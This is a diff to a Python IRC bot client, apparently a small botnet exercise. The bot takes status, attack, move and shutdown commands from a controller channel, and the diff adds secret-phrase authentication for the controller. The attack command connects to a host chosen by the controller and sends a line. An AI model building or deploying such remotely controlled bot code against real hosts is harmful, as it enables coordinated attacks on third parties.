@@ -19,7 +19,6 @@ secret_phrase = ""
 nick = "V"
 atk_cnt = 0
 active = True
-
 '''
 ------------------------------------------------------------------------
                              Commands 
@@ -27,13 +26,13 @@ active = True
 '''
 
 #return status to controller	
-def cmd_status():
-	return_status(nick)
+def cmd_status(con_nick):
+	return_status(nick, con_nick)
 	return
 	
 	
 #attack a specified host 
-def cmd_attack(host, port):
+def cmd_attack(host, port, con_nick):
 	global atk_cnt
 	target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	#make connection with target and return status to controller
@@ -45,20 +44,20 @@ def cmd_attack(host, port):
 		port = int(port)
 		target.connect((host,port))
 		target.send(bytes(str(atk_cnt) + " " + nick + "\n", 'UTF-8'))
-		return_status(nick + " success")
+		return_status(nick + " success", con_nick)
 		atk_cnt += 1
 	#failed to attack
 	except socket.error:
-		return_status(nick + " failure")
+		return_status(nick + " failure", con_nick)
 	return
 
 	
 #move to a new irc server
-def cmd_move(host, port_num, chan):
+def cmd_move(host, port_num, chan, con_nick):
 	global irc, hostname, port, channel
 	chan = "#" + chan
 	if hostname == host and port == port_num:
-		return_status(nick + " success")
+		return_status(nick + " success", con_nick)
 		channel = chan
 		send(irc, "NICK " + nick + "\n")
 		send(irc, "JOIN " + channel + "\n")
@@ -78,7 +77,7 @@ def cmd_move(host, port_num, chan):
 		#if connection failed, reset values
 		if status == ERROR_FLAG:
 			print("Error: Could not move to new IRC server")
-			return_status(nick + " failure")
+			return_status(nick + " failure", con_nick)
 			hostname = old_host
 			port = old_port
 			channel = old_channel
@@ -86,7 +85,7 @@ def cmd_move(host, port_num, chan):
 		else:
 			#close old IRC connection
 			channel = old_channel
-			return_status(nick + " success")
+			return_status(nick + " success", con_nick)
 			channel = chan
 			send(irc, "QUIT I will live on.../n")
 			irc.close()
@@ -95,17 +94,17 @@ def cmd_move(host, port_num, chan):
 	
 	
 #do nothing
-def cmd_quit():
+def cmd_quit(con_nick):
 	return
 	
 	
 #return status and shutdown
-def cmd_shutdown():
+def cmd_shutdown(con_nick):
 	global active
 	#signal to communication and program loops to break
 	active = False
 	#tell controller quitting and disconnect
-	return_status(nick + " shutdown")
+	return_status(nick + " shutdown", con_nick)
 	send(irc, "QUIT you killed me... /n")
 	return
 
@@ -149,8 +148,8 @@ def send(sock, msg):
 	
 	
 #return a status message to the controller
-def return_status(msg):
-	send(irc, "PRIVMSG " + channel + " :" + msg + "\n")
+def return_status(msg, con_nick):
+	send(irc, "PRIVMSG " + con_nick + " :" + msg + "\n")
 	return
 	
 	
@@ -188,11 +187,10 @@ def connect(sock, host, port):
                              Communication loop
 ------------------------------------------------------------------------
 '''
+
 	
 #handle the connection to the IRC server
 def handle_connection():
-	#TO DO Verify controller
-	
 	while active:
 		#wait for commands
 		cmd = rcv_command(irc)
@@ -200,27 +198,30 @@ def handle_connection():
 		#interpret command
 		if cmd == "\n":
 			pass
-		elif cmd[0] == "status":
-			cmd_status()
-		elif cmd[0] == "attack":
-			try:
-				cmd_attack(cmd[1], cmd[2])
-			except IndexError:
-					print("Error: Insufficient arguments for cmd(attack)")	
-		elif cmd[0] == "move":
-			try:
-				cmd_move(cmd[1], cmd[2], cmd[3])
-			except IndexError:
-				print("Error: Insufficient arguments for cmd(move)")	
-		elif cmd[0] == "quit":
-			cmd_quit()
-		elif cmd[0] == "shutdown":
-			cmd_shutdown()
-		elif con_active == False:
-			print("Error: Connection is dead")
-			break
+		elif cmd[len(cmd)-1] == secret_phrase:
+			if cmd[0] == "status":
+				cmd_status(cmd[len(cmd)-2])
+			elif cmd[0] == "attack":
+				try:
+					cmd_attack(cmd[1], cmd[2], cmd[len(cmd)-2])
+				except IndexError:
+						print("Error: Insufficient arguments for cmd(attack)")	
+			elif cmd[0] == "move":
+				try:
+					cmd_move(cmd[1], cmd[2], cmd[3], cmd[len(cmd)-2])
+				except IndexError:
+					print("Error: Insufficient arguments for cmd(move)")	
+			elif cmd[0] == "quit":
+				cmd_quit(cmd[len(cmd)-2])
+			elif cmd[0] == "shutdown":
+				cmd_shutdown(cmd[len(cmd)-2])
+			elif con_active == False:
+				print("Error: Connection is dead")
+				break
+			else:
+				print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
 		else:
-			print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
+			print("Error: unauthorized controller")
 	return
 
 
